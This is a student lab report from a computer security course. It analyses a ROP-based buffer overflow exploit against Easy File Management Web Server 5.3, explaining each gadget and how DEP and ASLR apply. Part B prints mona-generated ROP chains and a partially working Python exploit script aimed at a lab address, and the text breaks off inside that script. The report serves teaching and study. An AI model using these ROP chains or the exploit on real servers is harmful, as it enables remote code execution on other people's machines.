---
author:
- Fred Nordell and Hanna Höjbert, dat15fno, ha0223ho-s
date: October 2020
postedAt: 2021-02-08
title: ROP-based attack on Easy File manager server
description: This report was written for the EITN50 - Advanced Computer Security course by me and lab partner Hanna Höjbert. The report explores the attack on the Easy File manager server by privilege escalation using a ROP-based attack.
---

# Part A

## Assignment 1

We start the Easy File manager server, it opens a login page accessible
to the internet. When we execute the exploit, the exploit sends a
request to the server with a malicious payload in the userId field. The
File Manager program window then closes and a Microsoft calculator
window opens and the File manager program exits.

## Assignment 2

In figure [1](/post/adsec_pD/#fig:stack_ill) the stack is illustrated.

### Gadget 1: `call_edx=pack(’<L’,0x1001D8C8)`

This gadget manipulates the ESP to point to our next gadget, acting as a
stack pivot to enable us to control the execution flow.

### Gadget 2: `ppr=pack(’<L’,0x10010101)`

This gadget pops the stack to fill EBX and ECX with desired values and
also moves the ESP to point at the last gadgets memory address.

### Gadget 3: `crafted_jmp_esp=pack(’<L’,0xA445ABCF)`

This value is added to the stack to later be manipulated such that the
JMP ESP instruction jumps to the stack.

### Gadget 4: `test_bl=pack(’<L’,0x10010125)`

Contains 00000000 to pass the JNZ instruction

### Gadget 5: `kungfu`

Moves EBX to EAX so we can return it to the JMP instruction. pops stack
and puts it into ESI pops stack and puts into EBX Add 0x5BFFC883 to EAX
to finish crafting the address to the JMP ESP instruction. Then pushses
EAX to stack and returns

![Stack illustrated#fig:stack_ill](stack_illustrated.png)

## Assignment 3

The goal of the exploit is to move execution to the stack. To be able to
do this the exploit adds hand-crafted memory-addresses to the stack via
a buffer overflow such that the ESP will point to them at return time in
a specific order. The gadgets are located in the ImageLoad library. With
these we can craft a known value to the ESP such that when we come to
the JMP ESP command it will jump to the stack and start executing. There
a NOP-sled is present and then the shellcode to open a calculator
instance.

**Bolded** instructions are essential to the exploit.

### Gadget 1

We're restoring the callee saved registers EBX, EDI and ESI that have
been pushed to the stack. Then instead of moving EBP into ESP we create
a new ESP where we will return. Also, we're poping the value that was in
EBX into EBP and vice versa.

1.  POP EDI - EDI Goes from 0x10010126 to 0x00468705 & ESP to
    0x05049794 - This is a non-essensial instruction.

2.  POP ESI - Goes from 0x050498c8 to 0x00000000 - This is a
    non-essensial instruction.

3.  POP EBP - Goes from 0xFFFFFFFF to 0x00000000 - This is a
    non-essensial instruction.

4.  POP EBX - Goes from 0x00000000 to 0x0244ef58 - This is a
    non-essensial instruction.

5.  **ADD ESP, 24C** - ESP goes from 0x050497a0 to 0x50499ec - This is
    the stack pivot, we modify the ESP to point to a known value that
    will then start execution of gadget 2 after the return.

6.  **RETN** - This moves execution to ESP which in this case was
    pointed to the stack. The value on the stack was 0x10010101 which
    represent the next gadget operations and we will go trough them
    next.

### Gadget 2

1.  **POP EBX** - This fetches the value 0xa445abcf from the stack which
    was put there by us and puts it in the EBX register, which usually
    is a caller controlled register.

2.  **POP ECX** - This fetches the value 0x10010126 from the stack which
    was put there by us and puts it in the ECX register. This address
    contains 00000000 which we will use to bypass JNZ.

3.  **RETN** - We will now move execution to the value where ESP points,
    as we're still on the stack this will be the value were ESP =
    0x050499F. That value is 0x10022aac and corresponds to the next
    gadgets instuctions.

### Gadget 3

We have 2 0xdeadbeef fillers because we have to move the ESP 2 values to
the memory address 0x1001A181 where our next instructions are. And
because this gadget have the POP ESI and POP EBX instructions we have to
fill the stack with something to be able to get the right ESP value for
our return.

1.  **MOV EAX, EBX** - We now move the crafted jump value 0xa445abcf
    that exists in EBX into EAX, because in our next gadget EAX will be
    pushed to the stack.

2.  POP ESI - Pops the filler from the stack and puts it into ESI

3.  POP EBX - Pops the filler from the stack and puts it into EBX

4.  **RETN** - We now return to the stack pointer value, 0x05049a04
    which is 0x1001a187. That is the address of the next gadget.

### Gadget 4

1.  **ADD EAX, 5bffc883** - this adds\
    x5bffc883 to EAX so that it becomes\
    x00457452, as such this finishes the crafting of the jump address.

2.  **RETN** - We move execution to\
    x1002466d where the next gadget is.

### Gadget 5

1.  **PUSH EAX** - This adds the value\
    x00457452 to the stack. This is because after the return statement
    the instruction JMP ESP will be executed and by pushing this value
    to the stack it will be at the top and subsequently the execution
    will jump to this value.

2.  **RETN** - Moves execution to\
    x00457452 (JMP ESP) leaving the ESP pointing at\
    x05049a0c will then move the execution to the stack.

### Executing the shellcode

1.  **JMP ESP** - Because we were able to return to the JMP with the ESP
    in a known state,\
    x05049a0c that is on the stack, the program will now jump and start
    executing values on the stack. More precisely our NOP-sled and then
    Shellcode.

## Assignment 4

The imageload library is not protected by ASLR, because of this we are
able to use the imageload library for our ROP chain with absolute
addresses.

## Assignment 5

It uses a buffer overflow attack to initiate a ROP attack.

It uses known-location code to modify the stack and stack pointer to be
able to point it to a NOP-sled that ends in the shell code.

## Assignment 6

No, DEP is not enabled because we can write to the stack but then also
execute from it.

## Assignment 7

There are at least 2 ways that we could find to circumvent the DEP
protection. The first exploit uses the inbuilt function
`SetProcessDEPPolicy` that overrides the system set DEP policy<sup>[1](/post/adsec_pD/#c1)</sup>. The
exploit is targeted at Freefloat FTP Server 1.0 and does a DEP Bypass
with ROP<sup>[2](/post/adsec_pD/#c2)</sup>. The other exploit we found is targeted at Steinberg
MyMp3PRO 5.0 and uses a Buffer Overflow (SEH) with a DEP Bypass and ROP.
The exploit is local and as such creates a file that the program then
loads, because the program loads the MP3 files and then executes them
the DEP protection does not work.

Probably by finding a address with `SetProcessDEPPolicy` to disable the
DEP protection. There are other functions that we can use to disable DEP
protection, the Mona plugin for the Immunity debugger will help us find
a suitable ROP chain to bypass DEP.

# Part B

## Assignment 8

### Attempt 1

We ran mona in the Immunity debugger with the command:
`!mona rop -cbp ’0x00’ -m *.dll` and got the rop chain below. However,
when we ran it with the `-rva` parameter to circumvent ASLR the
execution took over 1h and we did not get any useful results.

```python
  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c88a06,  # POP ECX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
      0x758a0928,  # ptr to &VirtualProtect() [IAT kernel32.dll] ** REBASED ** ASLR
      0x7676fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x766ba513,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x7618f8ab,  # & jmp esp [urlmon.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x768d19ca,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76c39b64,  # NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x7610fa47,  # XCHG EAX,EBX # RETN [urlmon.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x759425bd,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x768b2f3a,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x751dd33b,  # XCHG EAX,EDX # RETN [COMCTL32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x76c21a87,  # POP ECX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x7665daae,  # &Writable location [WININET.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x75cbfb21,  # POP EDI # RETN [ole32.dll] ** REBASED ** ASLR 
      0x768e0b8c,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x76ee63ed,  # POP EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75cd10ef,  # PUSHAD # RETN [ole32.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()
```

### Attempt 2

We ran the mona command:
`!mona rop -rva - cbp " x00" -m ImageLoad.dll,SSLEAY32.dll,LIBEAY32.dll,fmws.exe`
we got a rop chain. but we had to add some instructions. It involved
setting the edx register to it's coorect value and then, unsuccessfully,
crafting the jmp esp value into the eax register. The code can be found
in the listing below. We are very close to solving the last kinks but
were unable due to time constraints.

```python
#!/usr/bin/python
# Exploit Title: Easy File Management Web Server v5.3 - USERID Remote Buffer Overflow (ROP)
# Version:       5.3
# Date:          2014-05-31
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      http://www.rcesecurity.com
# Software Link: http://www.efssoft.com/
# Tested on:     WinXP-GER, Win7x64-GER, Win8-EN, Win8x64-GER
#
# Credits for vulnerability discovery:
# superkojiman (http://www.exploit-db.com/exploits/33453/)
#
# Howto / Notes:
# This scripts exploits the buffer overflow vulnerability caused by an oversized UserID - string as
# discovered by superkojiman. In comparison to superkojiman's exploit, this exploit does not 
# brute force the address of the overwritten stackpart, instead it uses code from its own 
# .text segment to achieve reliable code execution.

from struct import pack
import socket,sys
import os
 
host="10.0.2.15"
port=80

def create_rop_chain(base_ImageLoad_dll):
	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	  #[---INFO:gadgets_to_set_ebx:---]
	  base_ImageLoad_dll + 0x00018a3a,  # POP EBX # RETN [ImageLoad.dll] 
	  0xffffffff,                       #  
	  base_ImageLoad_dll + 0x0001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
	  base_ImageLoad_dll + 0x0001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
	  #[---INFO:gadgets_to_set_edx:---]
	  base_ImageLoad_dll + 0x0001a857,	#(RVA : 0x0001a857) : # POP EBX # RETN    ** [ImageLoad.dll] **   |   {PAGE_EXECUTE_READ}
	  0x1001C8C8,						# 1001C8C8 + 0x1001C8C8 = 0x00001000 Value to be put into EDX
	  base_ImageLoad_dll + 0x00022c1e,  #(RVA : 0x00022c1e) : # ADD EDX,EBX # POP EBX # RETN 0x10    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}
	  0x41414141,                       # Filler (compensate)
	  #[---INFO:gadgets_to_set_ecx:---]
	  base_ImageLoad_dll + 0x00019aa2,  # POP ECX # RETN [ImageLoad.dll] 
	  0xffffffff,                       # ska bli 65
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  base_ImageLoad_dll + 0x00021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  0x41414141,                       # Filler (compensate)
	  #[---INFO:gadgets_to_set_ebp:---]
	  base_ImageLoad_dll + 0x00015442,  # POP EAX # RETN [ImageLoad.dll]
	  0xA445ABCF,						# Since 0x00 would break the exploit, the 0x00457452 (JMP ESP [fmws.exe]) needs to be crafted on the stack
	  0x1001a187,						# ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
	  0x1002466d,						# PUSH EAX # RETN [ImageLoad.dll]
	  base_ImageLoad_dll + 0x0001add7,  # POP EBP # RETN [ImageLoad.dll]
	  #[---INFO:gadgets_to_set_edi:---]
	  base_ImageLoad_dll + 0x00015d89,  # POP EDI # RETN [ImageLoad.dll] 
	  base_ImageLoad_dll + 0x0001a858,  # RETN (ROP NOP) [ImageLoad.dll]
	  #[---INFO:gadgets_to_set_esi:---]
	  base_ImageLoad_dll + 0x0001b0cb,  # POP ESI # RETN [ImageLoad.dll]
	  0x75cf1856, 						# Valloc	  
	  #base_ImageLoad_dll + 0x00021e9d,  # JMP [EAX] [ImageLoad.dll]
	  #base_ImageLoad_dll + 0x00015442,  # POP EAX # RETN [ImageLoad.dll] 
	  #base_ImageLoad_dll + 0x0004d1fc,  # ptr to &VirtualAlloc() [IAT ImageLoad.dll]
	  #[---INFO:pushad:---]
	  base_ImageLoad_dll + 0x000240c2, 	 # PUSHAD # RETN [ImageLoad.dll] 
	  #[---INFO:extras:---]
	  #0x00000000,  # <- Unable to find ptr to 'jmp esp'
	  #0x10002682,
	]
	return ''.join(pack('<I', _) for _ in rop_gadgets)

# [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Management Web Server\ImageLoad.dll)
base_ImageLoad_dll = 0x10000000
rop_chain = create_rop_chain(base_ImageLoad_dll)

junk0 = "\x90" * 80

# Instead of bruteforcing the stack address, let's take an address
# from the .text segment, which is near to the stackpivot instruction:
# 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll] 
